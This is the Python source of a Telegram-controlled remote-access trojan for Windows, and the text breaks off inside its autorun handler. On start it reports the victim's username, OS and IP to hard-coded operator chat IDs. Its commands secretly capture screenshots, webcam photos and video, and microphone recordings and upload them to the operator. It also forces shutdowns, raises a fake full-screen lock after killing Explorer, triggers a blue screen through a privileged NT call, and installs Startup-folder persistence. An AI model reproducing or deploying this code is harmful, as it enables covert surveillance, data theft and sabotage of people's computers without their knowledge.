# -*- coding: utf8 -*-

import os
import sys
import threading

import cv2
import wave
import time
import shutil
import telebot
import pyaudio
import requests
import platform
import webbrowser
import urllib.request
import ctypes
import hashlib
import pyautogui
import pyperclip
import py_win_keyboard_layout
from PIL import ImageGrab
from desktopmagic.screengrab_win32 import getScreenAsImage
from tkinter import *
from telebot import types
from telebot import util
from ctypes import *
from ctypes.wintypes import *
from urllib.error import HTTPError
from win32gui import GetWindowText, GetForegroundWindow
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pyautogui import leftClick, center, locateOnScreen
from datetime import datetime
import pytz

fname = 'mscer' + os.path.splitext(os.path.basename(sys.argv[0]))[1]

token = 'REMOVED_TELEGRAM_BOT_TOKEN'
bot = telebot.TeleBot(token)

pyautogui.FAILSAFE=False

adm = [6790944789]
state = 1

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/WebcamVid\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/AutoRun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton("5 Секунд", callback_data='vid5')
button2 = types.InlineKeyboardButton("10 Секунд", callback_data='vid10')
button3 = types.InlineKeyboardButton("15 Секунд", callback_data='vid15')
button4 = types.InlineKeyboardButton("30 Секунд", callback_data='vid30')
button5 = types.InlineKeyboardButton("60 Секунд", callback_data='vid60')
button6 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main2.add(button1)
main2.add(button2)
main2.add(button3)
main2.add(button4)
main2.add(button5)
main2.add(button6)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton("5 Секунд", callback_data='audio5')
button2 = types.InlineKeyboardButton("10 Секунд", callback_data='audio10')
button3 = types.InlineKeyboardButton("15 Секунд", callback_data='audio15')
button4 = types.InlineKeyboardButton("30 Секунд", callback_data='audio30')
button5 = types.InlineKeyboardButton("60 Секунд", callback_data='audio60')
button6 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main3.add(button1)
main3.add(button2)
main3.add(button3)
main3.add(button4)
main3.add(button5)
main3.add(button6)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Выключить - ⛔️', callback_data='poweroff')
button2 = types.InlineKeyboardButton('Перезагрузить - ⭕️', callback_data='reboot')
button3 = types.InlineKeyboardButton('Выключить экран - 🟥', callback_data='screenoff')
button4 = types.InlineKeyboardButton('Включить экран - 🟩', callback_data='screenon')
button5 = types.InlineKeyboardButton('Заблокировать - 🟡', callback_data='lockwin')
button6 = types.InlineKeyboardButton('Синий экран смерти - 🌀', callback_data='bsod')
button7 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main4.row(button1, button2)
main4.row(button3, button4)
main4.row(button5, button6)
main4.row(button7)

main5 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Сохранить - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Удалить - ♻️', callback_data='uninstall')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main5.row(button1)
main5.row(button2)
main5.row(button3)

main6 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Restart\n🔄')
button6 = types.KeyboardButton('/Combination\n⌨️')
button7 = types.KeyboardButton('/Printtext\n⌨️')
button8 = types.KeyboardButton('/Tasklist\n📋')
button9 = types.KeyboardButton('/Taskkill\n📝')
main6.row(button1, button2, button3)
main6.row(button4, button5)
main6.row(button6, button7)
main6.row(button8, button9)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/PWD\n📄')
button4 = types.KeyboardButton('/Delete\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Voice\n📢')
button6 = types.KeyboardButton('/Mouse\n📢')
button7 = types.KeyboardButton('/OpenURL\n🌐')
button8 = types.KeyboardButton('/Wallpapers\n🧩')
button9 = types.KeyboardButton('/OpenEXE\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5, button6)
main8.row(button7, button8, button9)

main15 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/LeftClick')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/RightClick')
button4 = types.KeyboardButton('/LeftDoubleClick')
button5 = types.KeyboardButton('/MiddleClick')
button6 = types.KeyboardButton('/RightHold')
button7 = types.KeyboardButton('/AutoAcceptOn')
button8 = types.KeyboardButton('/MoveMouse')
button9 = types.KeyboardButton('/AutoAcceptOff')
button10 = types.KeyboardButton('/Cancel3')
main15.row(button1, button2, button3)
main15.row(button4, button5, button6)
main15.row(button7, button8, button9)
main15.row(button10)

main9 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Открыть один раз - 🧨', callback_data='startfile')
button2 = types.InlineKeyboardButton('Открыть много раз - 💣', callback_data='infinityopen')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main9.row(button1)
main9.row(button2)
main9.row(button3)

main10 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Chrome - 🍥', callback_data='chrome')
button5 = types.InlineKeyboardButton('Explorer - 📂', callback_data='explorer')
button2 = types.InlineKeyboardButton('Paint - 🎨', callback_data='paint')
button3 = types.InlineKeyboardButton('CMD - ◼️', callback_data='cmd')
button4 = types.InlineKeyboardButton('« Назад', callback_data='back')
main10.row(button1)
main10.row(button5)
main10.row(button2)
main10.row(button3)
main10.row(button4)

main11 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Chrome - 🍥', callback_data='infchrome')
button5 = types.InlineKeyboardButton('Explorer - 📂', callback_data='infexplorer')
button2 = types.InlineKeyboardButton('Paint - 🎨', callback_data='infpaint')
button3 = types.InlineKeyboardButton('CMD - ◼️', callback_data='infcmd')
button4 = types.InlineKeyboardButton('« Назад', callback_data='back')
main11.row(button1)
main11.row(button5)
main11.row(button2)
main11.row(button3)
main11.row(button4)

main12 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Да, удалить', callback_data='confirm')
button2 = types.InlineKeyboardButton('Не удалять', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main12.row(button1)
main12.row(button2)
main12.row(button3)

main13 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Остановить все процессы', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Отключить диспетчер задач', callback_data='disabletaskmgr')
button3 = types.InlineKeyboardButton('Включить диспетчер задач', callback_data='enabletaskmgr')
main13.row(button1)
main13.row(button2)
main13.row(button3)

main14 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Комбинация клавиш', callback_data='combination')
button2 = types.InlineKeyboardButton('Ввести текст', callback_data='printtext')
main14.row(button1)
main14.row(button2)

closeme = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('✅', callback_data='closeme')
closeme.row(button1)

try:
    try:
        r = requests.get('https://ipinfo.io/json', verify = True)
        IP = r.json()['ip']
    except:
        IP = "Не удалось получить информацию"
    for i in adm:
        bot.send_message(i,
             '\n🟢 Online!'
             '\n' + '\nPC » ' + os.getlogin() +
             '\nOS » ' + platform.system() + ' ' + platform.release() +
             '\n'
             '\nIP » ' + IP,
             reply_markup=menu)
    if os.path.exists('C:\\ProgramData\\Files'):
        pass
    else:
        os.makedirs('C:\\ProgramData\\Files')
        os.makedirs('C:\\ProgramData\\Files\\Documents')
        os.makedirs('C:\\ProgramData\\Files\\Photos')
except:
    time.sleep(30)
    stoper = 0
    try:
        os.startfile('C:\\ProgramData\\Files\\start.vbs')
    except:
        try:
            os.startfile(
                'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
        except:
            stoper = 1
    if stoper == 0:
        os.system('taskkill /f /im py.exe')
        exit()

try:
    py_win_keyboard_layout.change_foreground_window_keyboard_layout(0x04090409)
except:
    pass


def sp():
    global btn
    global ent
    global wm
    global wm2
    try:
        if hashlib.sha1(hashlib.sha256(ent.get().encode()).hexdigest().encode()).hexdigest() == "ef3b545a3ac258aa43ea339e95851470ffadda19":
            stoper = 0
            os.startfile("explorer.exe")
            try:
                os.startfile('C:\\ProgramData\\Files\\start.vbs')
            except:
                try:
                    os.startfile(
                        'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
                except:
                    stoper = 1
            if stoper == 0:
                wm.destroy()
                try:
                    wm2.destroy()
                except:
                    pass
                os.system('taskkill /f /im py.exe')
                exit()
        else:
            ent.delete(0, END)
            ent.insert(0, "Пароль неверный")
            ent.focus()
    except:
        pass
def hs():
    global btn
    global ent
    global lb
    global info
    global state
    try:
        if state == -1:
            lb.pack_forget()
            info.pack_forget()
            ent.pack_forget()
            btn.pack_forget()
        if state == 1:
            lb.pack()
            info.pack()
            ent.pack(pady=10)
            ent.focus()
            btn.pack()
        state = state * -1
    except:
        pass

def changeuser():
    os.system('logoff')

@bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
def help(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id,
                         'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
                         '\n'
                         '\n'
                         '\n/Screen -  Скриншот экрана'
                         '\n/Webcam - Фото с вебки'
                         '\n/WebcamVid - Видео с вебки'
                         '\n/Audio - Запись микрофона'
                         '\n/Power - Управление питанием'
                         '\n/AutoRun - Автозагрузка'
                         '\n'
                         '\n/Files - Файловый менеджер'
                         '\n> /CD - Текущая директория'
                         '\n> /Pwd - Просмотр содержимого'
                         '\n> /Delete - Удалить файл'
                         '\n> /Upload - Загрузить файл'
                         '\n> /Download - Скачать файл'
                         '\n> /Run - Запустить файл'
                         '\n/Tasklist - Список процессов'
                         '\n/Taskkill - Остановить процесс'
                         '\n'
                         '\n/Message - Отправить сообщение'
                         '\n/Voice - Озвучить сообщение'
                         '\n/OpenURL - Открыть ссылку'
                         '\n/Wallpapers - Установить обои'
                         '\n/OpenEXE - Запуск программ'
                         '\n'
                         '\n '
                         '\n_Coded by X1nDi | *@x1ndi0* 👾',
                         reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['3', '6'])
def main(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['2', '5'])
def main(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")

@bot.message_handler(commands=['4', '1'])
def main(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Screen', 'screen'])
def screen(command):
    if command.chat.id in adm:
        try:
            bot.send_chat_action(command.chat.id, 'upload_photo')
            entireScreen = getScreenAsImage()
            entireScreen.save('C:\\ProgramData\\Files\\Photos\\Screenshot.png', format='png')
            screen = open('C:\\ProgramData\\Files\\Photos\\Screenshot.png', 'rb')
            bot.send_photo(command.chat.id, screen)
            screen.close()
            os.remove('C:\\ProgramData\\Files\\Photos\\Screenshot.png')
            screen = ImageGrab.grab()
            screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
            screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
            bot.send_photo(command.chat.id, screen)
            screen.close()
            os.remove('C:\\ProgramData\\Screenshot.jpg')
        except Exception as e:
            try:
                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
                log.close()
                try:
                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
                except:
                    pass
            except:
                pass

@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
    if command.chat.id in adm:
        try:
            bot.send_chat_action(command.chat.id, 'upload_photo')
            cap = cv2.VideoCapture(0)
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)
            cap.release()
            webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
            bot.send_photo(command.chat.id, webcam)
            webcam.close()
            os.remove('C:\\ProgramData\\Webcam.jpg')
        except:
            bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(commands=['WebcamVid', 'webcamvid'])
def webcam(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите длительность видео*', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Audio', 'audio'])
def audio(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите длительность записи*', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def power(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main4, parse_mode="Markdown")

@bot.message_handler(commands=['AutoRun', 'autorun'])
def autorun(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['OpenEXE', 'openexe'])
def openexe(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    global btn
    global ent
    global lb
    global info
    global btnhs
    global wm
    global wm2
    if call.message:
        if call.message.chat.id in adm:
            if call.data == 'closeme':
                bot.delete_message(call.message.chat.id, call.message.id)

            if call.data == 'vid5':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'upload_video')
                  capture_duration = 5
                  cap = cv2.VideoCapture(0)
                  fourcc = cv2.VideoWriter_fourcc(*'XVID')
                  out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
                  start_time = time.time()
                  while( int(time.time() - start_time) < capture_duration ):
                     ret, frame = cap.read()
                     if ret==True:
                         frame = cv2.flip(frame,1)
                         out.write(frame)
                     else:
                         break
                  cap.release()
                  out.release()
                  cv2.destroyAllWindows()
                  webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
                  bot.send_animation(call.message.chat.id, webcamvid)
                  webcamvid.close()
                  os.remove('C:\\ProgramData\\WebcamVid.mp4')
                except:
                    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")


            if call.data == 'vid10':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'upload_video')
                  capture_duration = 10
                  cap = cv2.VideoCapture(0)
                  fourcc = cv2.VideoWriter_fourcc(*'XVID')
                  out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
                  start_time = time.time()
                  while( int(time.time() - start_time) < capture_duration ):
                     ret, frame = cap.read()
                     if ret==True:
                         frame = cv2.flip(frame,1)
                         out.write(frame)
                     else:
                         break
                  cap.release()
                  out.release()
                  cv2.destroyAllWindows()
                  webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
                  bot.send_animation(call.message.chat.id, webcamvid)
                  webcamvid.close()
                  os.remove('C:\\ProgramData\\WebcamVid.mp4')
                except:
                    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")

            if call.data == 'vid15':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'upload_video')
                  capture_duration = 15
                  cap = cv2.VideoCapture(0)
                  fourcc = cv2.VideoWriter_fourcc(*'XVID')
                  out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
                  start_time = time.time()
                  while( int(time.time() - start_time) < capture_duration ):
                     ret, frame = cap.read()
                     if ret==True:
                         frame = cv2.flip(frame,1)
                         out.write(frame)
                     else:
                         break
                  cap.release()
                  out.release()
                  cv2.destroyAllWindows()
                  webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
                  bot.send_animation(call.message.chat.id, webcamvid)
                  webcamvid.close()
                  os.remove('C:\\ProgramData\\WebcamVid.mp4')
                except:
                    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")

            if call.data == 'vid30':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'upload_video')
                  capture_duration = 30
                  cap = cv2.VideoCapture(0)
                  fourcc = cv2.VideoWriter_fourcc(*'XVID')
                  out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
                  start_time = time.time()
                  while( int(time.time() - start_time) < capture_duration ):
                     ret, frame = cap.read()
                     if ret==True:
                         frame = cv2.flip(frame,1)
                         out.write(frame)
                     else:
                         break
                  cap.release()
                  out.release()
                  cv2.destroyAllWindows()
                  webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
                  bot.send_animation(call.message.chat.id, webcamvid)
                  webcamvid.close()
                  os.remove('C:\\ProgramData\\WebcamVid.mp4')
                except:
                    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")

            if call.data == 'vid60':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'upload_video')
                  capture_duration = 60
                  cap = cv2.VideoCapture(0)
                  fourcc = cv2.VideoWriter_fourcc(*'XVID')
                  out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
                  start_time = time.time()
                  while( int(time.time() - start_time) < capture_duration ):
                     ret, frame = cap.read()
                     if ret==True:
                         frame = cv2.flip(frame,1)
                         out.write(frame)
                     else:
                         break
                  cap.release()
                  out.release()
                  cv2.destroyAllWindows()
                  webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
                  bot.send_animation(call.message.chat.id, webcamvid)
                  webcamvid.close()
                  os.remove('C:\\ProgramData\\WebcamVid.mp4')
                except:
                    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")


            if call.data == 'audio5':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'record_audio')
                  CHUNK = 1024
                  FORMAT = pyaudio.paInt16
                  CHANNELS = 2
                  RATE = 44100
                  RECORD_SECONDS = 5
                  WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
                  p = pyaudio.PyAudio()
                  stream = p.open(format=FORMAT,
                                 channels=CHANNELS,
                                 rate=RATE,
                                 input=True,
                                 frames_per_buffer=CHUNK)
                  frames = []
                  for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
                     data = stream.read(CHUNK)
                     frames.append(data)
                  stream.stop_stream()
                  stream.close()
                  p.terminate()
                  wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                  wf.setnchannels(CHANNELS)
                  wf.setsampwidth(p.get_sample_size(FORMAT))
                  wf.setframerate(RATE)
                  wf.writeframes(b''.join(frames))
                  wf.close()
                  voice = open('C:\\ProgramData\\voice.wav', 'rb')
                  bot.send_voice(call.message.chat.id, voice)
                  voice.close()
                  os.remove('C:\\ProgramData\\voice.wav')
                except:
                    pass

            if call.data == 'audio10':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'record_audio')
                  CHUNK = 1024
                  FORMAT = pyaudio.paInt16
                  CHANNELS = 2
                  RATE = 44100
                  RECORD_SECONDS = 10
                  WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
                  p = pyaudio.PyAudio()
                  stream = p.open(format=FORMAT,
                                 channels=CHANNELS,
                                 rate=RATE,
                                 input=True,
                                 frames_per_buffer=CHUNK)
                  frames = []
                  for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
                     data = stream.read(CHUNK)
                     frames.append(data)
                  stream.stop_stream()
                  stream.close()
                  p.terminate()
                  wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                  wf.setnchannels(CHANNELS)
                  wf.setsampwidth(p.get_sample_size(FORMAT))
                  wf.setframerate(RATE)
                  wf.writeframes(b''.join(frames))
                  wf.close()
                  voice = open('C:\\ProgramData\\voice.wav', 'rb')
                  bot.send_voice(call.message.chat.id, voice)
                  voice.close()
                  os.remove('C:\\ProgramData\\voice.wav')
                except:
                    pass

            if call.data == 'audio15':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'record_audio')
                  CHUNK = 1024
                  FORMAT = pyaudio.paInt16
                  CHANNELS = 2
                  RATE = 44100
                  RECORD_SECONDS = 15
                  WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
                  p = pyaudio.PyAudio()
                  stream = p.open(format=FORMAT,
                                 channels=CHANNELS,
                                 rate=RATE,
                                 input=True,
                                 frames_per_buffer=CHUNK)
                  frames = []
                  for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
                     data = stream.read(CHUNK)
                     frames.append(data)
                  stream.stop_stream()
                  stream.close()
                  p.terminate()
                  wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                  wf.setnchannels(CHANNELS)
                  wf.setsampwidth(p.get_sample_size(FORMAT))
                  wf.setframerate(RATE)
                  wf.writeframes(b''.join(frames))
                  wf.close()
                  voice = open('C:\\ProgramData\\voice.wav', 'rb')
                  bot.send_voice(call.message.chat.id, voice)
                  voice.close()
                  os.remove('C:\\ProgramData\\voice.wav')
                except:
                    pass

            if call.data == 'audio30':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'record_audio')
                  CHUNK = 1024
                  FORMAT = pyaudio.paInt16
                  CHANNELS = 2
                  RATE = 44100
                  RECORD_SECONDS = 30
                  WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
                  p = pyaudio.PyAudio()
                  stream = p.open(format=FORMAT,
                                 channels=CHANNELS,
                                 rate=RATE,
                                 input=True,
                                 frames_per_buffer=CHUNK)
                  frames = []
                  for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
                     data = stream.read(CHUNK)
                     frames.append(data)
                  stream.stop_stream()
                  stream.close()
                  p.terminate()
                  wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                  wf.setnchannels(CHANNELS)
                  wf.setsampwidth(p.get_sample_size(FORMAT))
                  wf.setframerate(RATE)
                  wf.writeframes(b''.join(frames))
                  wf.close()
                  voice = open('C:\\ProgramData\\voice.wav', 'rb')
                  bot.send_voice(call.message.chat.id, voice)
                  voice.close()
                  os.remove('C:\\ProgramData\\voice.wav')
                except:
                    pass

            if call.data == 'audio60':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
                  bot.send_chat_action(call.message.chat.id, 'record_audio')
                  CHUNK = 1024
                  FORMAT = pyaudio.paInt16
                  CHANNELS = 2
                  RATE = 44100
                  RECORD_SECONDS = 60
                  WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
                  p = pyaudio.PyAudio()
                  stream = p.open(format=FORMAT,
                                 channels=CHANNELS,
                                 rate=RATE,
                                 input=True,
                                 frames_per_buffer=CHUNK)
                  frames = []
                  for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
                     data = stream.read(CHUNK)
                     frames.append(data)
                  stream.stop_stream()
                  stream.close()
                  p.terminate()
                  wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                  wf.setnchannels(CHANNELS)
                  wf.setsampwidth(p.get_sample_size(FORMAT))
                  wf.setframerate(RATE)
                  wf.writeframes(b''.join(frames))
                  wf.close()
                  voice = open('C:\\ProgramData\\voice.wav', 'rb')
                  bot.send_voice(call.message.chat.id, voice)
                  voice.close()
                  os.remove('C:\\ProgramData\\voice.wav')
                except:
                    pass

            if call.data == 'poweroff':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
                  os.system('shutdown -s /t 0 /f')
                except:
                  pass

            if call.data == 'reboot':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
                  os.system('shutdown -r /t 0 /f')
                except:
                  pass

            if call.data == 'screenoff':
                try:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Экран выключен!*', parse_mode="Markdown")
                    os.system('taskkill /f /im explorer.exe')
                    time.sleep(1)

                    wm = Tk()
                    wm.overrideredirect(1)
                    wm.state('zoomed')

                    def on_closing():
                        pass

                    wm.protocol("WM_DELETE_WINDOW", on_closing)

                    lb = Label(wm, text="    Компьютер заблокирован    ", font="Arial 75", fg="black")
                    info = Label(wm, text="Разблокировать может только владелец", font="Arial 35", fg="black")
                    btn = Button(wm, width=15, height=1, text="Разблокировать", command=sp)
                    ent = Entry(width=30)
                    btnhs = Button(wm, width=15, height=1, text=" ", command=hs)
                    btnlock = Button(wm, width=25, height=2, text="Сменить учётную запись", command=changeuser)
                    btnhs.place(relx=0.0, rely=1.0, anchor='sw')
                    btnlock.place(rely=1.0, relx=1.0, x=0, y=0, anchor=SE)


                    wm.lift()
                    wm.attributes('-topmost', True)
                    wm.after_idle(wm.attributes, '-topmost', True)
                    wm2 = Tk()
                    wm2.overrideredirect(1)
                    wm2.state('zoomed')
                    wm2.geometry('+1920+0')
                    wm2.protocol("WM_DELETE_WINDOW", on_closing)
                    wm2.lift()
                    wm2.attributes('-topmost', True)
                    wm2.after_idle(wm.attributes, '-topmost', True)
                    wm2.mainloop()
                    wm.mainloop()
                except:
                    pass

            if call.data == 'screenon':
                try:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                          text='*Экран включён!*', parse_mode="Markdown")
                    stoper = 0
                    os.startfile("explorer.exe")
                    try:
                        os.startfile('C:\\ProgramData\\Files\\start.vbs')
                    except:
                        try:
                            os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
                        except:
                            stoper = 1
                    if stoper == 0:
                        os.system('taskkill /f /im py.exe')
                        wm.destroy()
                        try:
                            wm2.destroy()
                        except:
                            pass
                        exit()
                except:
                    pass
            if call.data == 'lockwin':
                try:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                          text='*Компьютер заблокирован!*', parse_mode="Markdown")
                    ctypes.windll.user32.LockWorkStation()
                except:
                    pass

            if call.data == 'bsod':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
                  tmp1 = c_bool()
                  tmp2 = DWORD()
                  ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
                  ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
                except:
                  pass

            if call.data == 'startup':
                try:
                  path = 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
                  if os.path.exists(path + "start.vbs"):
